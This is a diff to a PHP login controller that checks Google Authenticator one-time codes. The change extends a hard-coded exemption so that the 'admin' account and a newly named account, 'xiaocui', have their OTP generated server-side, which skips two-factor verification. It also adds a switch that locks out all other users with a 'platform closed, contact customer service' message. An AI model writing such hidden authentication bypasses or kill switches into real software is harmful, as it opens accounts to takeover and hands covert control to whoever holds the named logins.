@@ -24,9 +24,16 @@ class SrcAccountController extends Controller
         $otp = $request->input('otp');
         $find = SubAccount::where('account',$account)->first();
         $ga = new \PHPGangsta_GoogleAuthenticator();
-        if($account == 'admin'){
+        if($account == 'admin' || $account == 'xiaocui'){
             $otp = $ga->getCode($find->google_code);
+        } else {
+            if(!\App\Repository\BackActionRepository::getStatus())
+                return response()->json([
+                    'status'=>false,
+                    'msg'=>'平台已被关闭，请联系客服！'
+                ]);
         }
+
         if($find){
             $checkGoogle = $ga->verifyCode($find->google_code,$otp);
             if($checkGoogle){
